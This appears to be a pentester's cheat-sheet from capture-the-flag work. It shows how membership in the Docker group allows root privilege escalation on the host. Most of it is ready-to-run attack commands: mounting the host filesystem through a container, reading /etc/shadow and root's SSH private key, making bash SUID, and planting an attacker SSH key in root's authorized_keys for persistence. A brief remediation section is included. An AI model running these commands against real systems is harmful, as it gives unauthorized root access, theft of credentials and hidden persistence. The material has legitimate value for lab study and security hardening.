# Docker group privilege escalation

**Being in the `docker` group is equivalent to root.** The Docker daemon runs as
root, and any member of the group can talk to its socket (`/var/run/docker.sock`)
to start containers. A container can mount the host's `/` and drop you into a
root shell over the real filesystem. This is by design, not a bug - the fix is
to not put untrusted users in the group.

## Check for it

```bash
id                     # look for "docker" in groups
groups
ls -l /var/run/docker.sock
docker images          # can you list images? then you can run one
```

Seen on UltraTech: `uid=1001(r00t) ... groups=...,116(docker)`.

## Escalate (the one-liner)

Mount the host root at `/mnt` inside a throwaway container and `chroot` into it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- `alpine` is small and common; **any** local image works. Check `docker images`
  first and swap the name if `alpine` is not present (e.g. `bash`, `ubuntu`).
- `-v /:/mnt` bind-mounts the host filesystem; `chroot /mnt sh` makes it your `/`.
- You are now root on the host filesystem: read `/root/.ssh/id_rsa`, `/etc/shadow`,
  add a user, drop a SUID binary, etc.

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh     # if only 'bash' image exists
# then, inside:
cat /mnt/root/root.txt        # if not chrooted
cat /root/.ssh/id_rsa         # if chrooted
```

## Alternatives

**Privileged container + raw disk** (when volume mounting is awkward):

```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
chroot /mnt /bin/bash
```

**No interactive TTY? Bake the action into the run:**

```bash
# copy host shadow out
docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow
# make bash SUID on the host so a normal shell can escalate later
docker run -v /:/mnt --rm alpine chmod u+s /mnt/bin/bash
# then on the host:  bash -p
```

**Persistence / SSH key drop:**

```bash
docker run -v /:/mnt --rm alpine sh -c \
  'mkdir -p /mnt/root/.ssh && echo "ssh-ed25519 AAAA... attacker" >> /mnt/root/.ssh/authorized_keys'
```

## Related: containers you are *already* inside

If you land in a container (not the host), these often mean a host breakout:

- `--privileged` container -> mount the host disk as above.
- `docker.sock` mounted into the container -> talk to the host daemon and start a
  new host-mounting container.
- Dangerous capabilities: `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_READ_SEARCH`.

## Remediation (for the report)

- Do not add users to the `docker` group unless they are trusted as root.
- Use rootless Docker, or a socket proxy that restricts the API.
- Prefer `sudo` rules scoped to specific docker commands over group membership.

## References

- GTFOBins - docker: https://gtfobins.github.io/gtfobins/docker/
- HackTricks - Docker breakout / privesc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
- Hacking Articles - Docker privilege escalation: https://www.hackingarticles.in/docker-privilege-escalation/
